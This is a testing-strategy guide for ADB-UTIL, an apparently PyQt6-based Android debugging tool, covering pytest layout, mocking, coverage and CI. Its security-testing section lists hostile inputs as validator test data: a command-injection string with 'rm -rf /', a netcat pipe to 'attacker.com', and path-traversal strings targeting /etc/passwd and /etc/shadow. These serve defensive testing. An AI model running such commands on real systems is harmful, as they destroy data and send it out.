# ADB-UTIL Testing Strategy & Best Practices

## 📋 Overview

This document outlines the comprehensive testing strategy for ADB-UTIL, including best practices, test organization, CI/CD integration, and contribution guidelines.

## 🏗️ Testing Architecture

### Test Structure
```
tests/
├── conftest.py                 # Shared fixtures and configuration
├── fixtures/                   # Additional test fixtures and data
├── adb/                       # ADB layer tests
│   ├── test_device_manager.py
│   ├── test_command_runner.py
│   ├── test_file_operations.py
│   └── test_logcat_handler.py
├── services/                  # Business logic tests
│   ├── test_script_manager.py
│   ├── test_config_manager.py
│   ├── test_tab_manager.py
│   └── test_live_editor.py
├── models/                    # Data model tests
│   ├── test_device.py
│   ├── test_command.py
│   └── test_tab.py
├── utils/                     # Utility function tests
│   ├── test_validators.py
│   ├── test_formatters.py
│   ├── test_logger.py
│   └── test_theme_manager.py
├── gui/                       # GUI component tests
│   ├── test_main_window.py
│   ├── test_device_tab.py
│   ├── test_script_manager_tab.py
│   └── test_file_manager.py
└── integration/               # End-to-end tests
    ├── test_device_workflows.py
    ├── test_script_workflows.py
    └── test_file_workflows.py
```

## 🎯 Testing Levels & Types

### 1. Unit Tests
**Purpose**: Test individual components in isolation
**Coverage Target**: 90%+

- **Models**: Data validation, serialization, business logic
- **Services**: CRUD operations, state management, file I/O
- **Utilities**: Pure functions, validation, formatting
- **ADB Layer**: Command execution, device discovery (mocked)

### 2. Integration Tests
**Purpose**: Test component interactions and workflows
**Coverage**: Critical user journeys

- **Device Discovery → Script Execution**
- **File Operations → Result Display**
- **Configuration Management → UI Updates**

### 3. GUI Tests
**Purpose**: Test PyQt6 components and user interactions
**Focus**: Logic and state management, not visual appearance

- **Signal/slot connections**
- **State updates**
- **Event handling**
- **Widget interactions**

### 4. Performance Tests
**Purpose**: Ensure acceptable performance under load
**Metrics**: Response time, memory usage, resource handling

- **Large file operations**
- **Multiple device handling**
- **Concurrent script execution**

## 🛠️ Testing Tools & Framework

### Core Testing Stack
```python
pytest>=7.4.0           # Primary testing framework
pytest-asyncio>=0.21.0  # Async test support
pytest-qt>=4.2.0        # PyQt6 testing
pytest-cov>=4.1.0       # Coverage reporting  
pytest-mock>=3.11.0     # Enhanced mocking
pytest-xdist>=3.3.0     # Parallel test execution
```

### Quality Tools
```python
coverage>=7.3.0         # Coverage analysis
black>=23.0.0           # Code formatting
flake8>=6.0.0           # Linting
mypy>=1.5.0            # Type checking
bandit                  # Security analysis
```

## 📝 Test Writing Best Practices

### 1. Test Organization
```python
class TestDeviceManager:
    """Test DeviceManager functionality."""
    
    def test_initialization(self):
        """Test proper initialization."""
        pass
    
    def test_discover_devices_success(self):
        """Test successful device discovery."""
        pass
    
    def test_discover_devices_failure(self):
        """Test device discovery failure handling."""
        pass

class TestDeviceManagerEdgeCases:
    """Test edge cases and error conditions."""
    
    def test_malformed_adb_output(self):
        """Test handling of malformed ADB output."""
        pass
```

### 2. Fixture Usage
```python
@pytest.fixture
def device_manager(mock_config_dir, mock_logger):
    """Create DeviceManager for testing."""
    return DeviceManager(config_dir=mock_config_dir)

def test_add_device(device_manager, sample_device_data):
    """Test adding device with fixture data."""
    device = device_manager.add_device(**sample_device_data)
    assert device.id == sample_device_data["id"]
```

### 3. Mocking Strategy
```python
@patch('subprocess.run')
def test_adb_command_execution(mock_subprocess):
    """Test ADB command execution with mocked subprocess."""
    mock_subprocess.return_value = Mock(
        stdout="device output",
        stderr="",
        returncode=0
    )
    
    result = execute_adb_command(["adb", "devices"])
    assert result.success
```

### 4. Parameterized Tests
```python
@pytest.mark.parametrize("device_id,expected", [
    ("emulator-5554", True),
    ("192.168.1.100:5555", True),
    ("invalid-device", False),
    ("", False)
])
def test_device_id_validation(device_id, expected):
    """Test device ID validation with multiple inputs."""
    assert validate_device_id(device_id) == expected
```

### 5. Async Testing
```python
@pytest.mark.asyncio
async def test_async_device_discovery():
    """Test async device discovery."""
    manager = DeviceManager()
    devices = await manager.discover_devices()
    assert isinstance(devices, list)
```

## 🏷️ Test Markers

### Standard Markers
```python
@pytest.mark.unit          # Unit tests
@pytest.mark.integration   # Integration tests
@pytest.mark.gui          # GUI tests (require PyQt6)
@pytest.mark.slow         # Slow-running tests
@pytest.mark.adb          # Tests requiring ADB mocking
@pytest.mark.file_ops     # File operation tests
```

### Custom Markers
```python
@pytest.mark.requires_adb  # Tests needing real ADB
@pytest.mark.network       # Tests requiring network
@pytest.mark.performance   # Performance benchmarks
```

## 🚀 Running Tests

### Development Testing
```bash
# Run all tests with coverage
pytest tests/ -v --cov=src --cov-report=html

# Run specific test category
pytest tests/ -m unit -v
pytest tests/ -m integration -v
pytest tests/ -m gui -v

# Run tests in parallel
pytest tests/ -n auto

# Run with specific Python version
python3.11 -m pytest tests/
```

### CI/CD Testing
```bash
# Full test suite with coverage
pytest tests/ -v --tb=short --cov=src --cov-report=xml --cov-report=html --junitxml=junit.xml

# Integration tests only
pytest tests/ -m integration --tb=short --junitxml=integration-junit.xml

# Performance tests
pytest tests/ -m "slow or performance" --benchmark-json=benchmark.json
```

## 📊 Coverage Requirements

### Coverage Targets
- **Overall Coverage**: 85%+
- **Critical Components**: 95%+
  - Device Manager
  - Script Manager  
  - File Operations
  - Configuration Management
- **GUI Components**: 70%+
- **Utility Functions**: 95%+

### Coverage Exclusions
```python
# pragma: no cover - exclude from coverage
def debug_function():  # pragma: no cover
    """Debug helper - not tested in CI."""
    pass
```

## 🔧 Mock Strategy

### ADB Operations
```python
@pytest.fixture
def mock_adb_subprocess():
    """Mock ADB subprocess calls."""
    with patch('subprocess.run') as mock_run:
        mock_run.return_value = Mock(
            stdout="List of devices attached\nemulator-5554\tdevice\n",
            stderr="",
            returncode=0
        )
        yield mock_run
```

### File System Operations
```python
@pytest.fixture
def mock_file_operations():
    """Mock file system operations."""
    with patch('builtins.open', mock_open(read_data="test data")):
        with patch('pathlib.Path.exists', return_value=True):
            yield
```

### PyQt6 Applications
```python
@pytest.fixture
def qapp():
    """Provide QApplication for GUI tests."""
    app = QApplication.instance()
    if app is None:
        app = QApplication([])
    yield app
    app.quit()
```

## 🔄 Continuous Integration

### Pipeline Stages
1. **Code Quality** - Black, Flake8, MyPy, Bandit
2. **Unit Tests** - Fast, isolated component tests
3. **Integration Tests** - Component interaction tests
4. **GUI Tests** - PyQt6 component tests (Linux only)
5. **Performance Tests** - Benchmarks and load tests
6. **Security Scan** - Dependency and code security
7. **Build & Package** - Multi-platform executables

### Multi-Platform Testing
- **Ubuntu 22.04** - Primary platform, GUI tests
- **Windows Server 2022** - Windows compatibility
- **macOS 12** - macOS compatibility

### Python Version Matrix
- **Python 3.9** - Minimum supported
- **Python 3.10** - LTS version
- **Python 3.11** - Primary development
- **Python 3.12** - Latest stable

## 🐛 Testing Guidelines

### 1. Test Naming
```python
def test_method_scenario_expected_outcome():
    """Test method under scenario expecting outcome."""
    pass

# Good examples:
def test_add_device_valid_data_returns_device():
def test_execute_script_nonexistent_script_returns_none():
def test_validate_ip_invalid_format_returns_false():
```

### 2. Test Documentation
```python
def test_device_discovery_with_timeout():
    """
    Test device discovery handles timeout gracefully.
    
    Scenario: ADB command times out during device discovery
    Expected: Returns empty list, logs warning, doesn't crash
    """
    pass
```

### 3. Assertion Messages
```python
# Good - descriptive assertion messages
assert len(devices) == 2, f"Expected 2 devices, got {len(devices)}"
assert device.is_online, f"Device {device.id} should be online"
```

### 4. Test Data Management
```python
# Use fixtures for reusable test data
@pytest.fixture
def sample_devices():
    """Generate sample device data."""
    return [
        Device(id="device1", status="online"),
        Device(id="device2", status="offline")
    ]

# Avoid hardcoded data in tests
def test_device_filtering(sample_devices):
    online_devices = filter_online_devices(sample_devices)
    assert len(online_devices) == 1
```

## 🎨 Testing Anti-Patterns to Avoid

### ❌ Don't Do This
```python
# Testing implementation details
def test_internal_method():
    obj = MyClass()
    assert obj._private_method() == "expected"

# Overly complex tests
def test_everything_at_once():
    # 50+ lines testing multiple unrelated things
    pass

# Fragile mocks
@patch('module.Class.method1')
@patch('module.Class.method2')
@patch('module.Class.method3')
def test_with_too_many_mocks():
    pass
```

### ✅ Do This Instead
```python
# Test public interface
def test_public_behavior():
    obj = MyClass()
    result = obj.public_method()
    assert result == "expected"

# Focused, single-purpose tests
def test_device_addition():
    manager = DeviceManager()
    device = manager.add_device("test-id")
    assert device in manager.devices

# Strategic mocking
def test_with_minimal_mocking(mock_subprocess):
    # Mock only external dependencies
    pass
```

## 📈 Performance Testing

### Benchmarking
```python
def test_device_discovery_performance(benchmark):
    """Benchmark device discovery performance."""
    manager = DeviceManager()
    result = benchmark(manager.discover_devices)
    assert len(result) >= 0
```

### Load Testing
```python
def test_concurrent_script_execution():
    """Test concurrent script execution performance."""
    manager = ScriptManager()
    
    # Execute 10 scripts concurrently
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [
            executor.submit(manager.execute_script, script_id)
            for script_id in script_ids
        ]
        
        results = [f.result() for f in futures]
        assert all(results)
```

## 🔐 Security Testing

### Input Validation
```python
def test_command_injection_prevention():
    """Test prevention of command injection attacks."""
    dangerous_inputs = [
        "adb shell; rm -rf /",
        "adb shell && format C:",
        "adb shell | nc attacker.com 1234"
    ]
    
    for dangerous_input in dangerous_inputs:
        assert not validate_adb_command(dangerous_input)
```

### File Path Traversal
```python
def test_path_traversal_prevention():
    """Test prevention of path traversal attacks."""
    dangerous_paths = [
        "../../../etc/passwd",
        "..\\..\\Windows\\System32",
        "/etc/shadow"
    ]
    
    for path in dangerous_paths:
        assert not validate_file_path(path)
```

## 📚 Contributing Guidelines

### Before Submitting Tests
1. **Run locally**: All tests pass on your machine
2. **Check coverage**: New code has appropriate test coverage
3. **Follow style**: Tests follow established patterns
4. **Document**: Complex tests have clear documentation

### Test Review Checklist
- [ ] Tests are focused and test one thing
- [ ] Test names clearly describe what's being tested
- [ ] Appropriate fixtures are used
- [ ] Mocking is minimal and strategic
- [ ] Edge cases and error conditions are covered
- [ ] Performance implications are considered

### Writing New Tests
1. **Identify the component** to test
2. **Write failing test** first (TDD approach)
3. **Implement minimal code** to make test pass
4. **Refactor** both code and test
5. **Add edge cases** and error conditions
6. **Update documentation** if needed

## 🔍 Debugging Tests

### Common Issues
```python
# Async test not awaiting
@pytest.mark.asyncio
async def test_async_operation():
    result = await async_function()  # Don't forget await!
    assert result

# PyQt6 tests without QApplication
def test_widget_behavior(qapp):  # Use qapp fixture
    widget = MyWidget()
    assert widget.isVisible()

# Missing mock configuration
def test_with_mock(mock_service):
    mock_service.return_value = "expected"  # Configure mock!
    result = use_service()
    assert result == "expected"
```

### Debug Commands
```bash
# Run single test with verbose output
pytest tests/test_device.py::test_device_creation -v -s

# Run with debugger
pytest tests/test_device.py --pdb

# Run with coverage report
pytest tests/ --cov=src --cov-report=term-missing
```

## 📞 Support & Resources

- **Issues**: Report bugs and request features on GitHub
- **Documentation**: Check docs/ directory for additional info
- **CI/CD**: View pipeline results in GitHub Actions
- **Coverage**: Check coverage reports in CI artifacts

---

*This testing strategy ensures ADB-UTIL maintains high quality, reliability, and performance across all supported platforms and use cases.*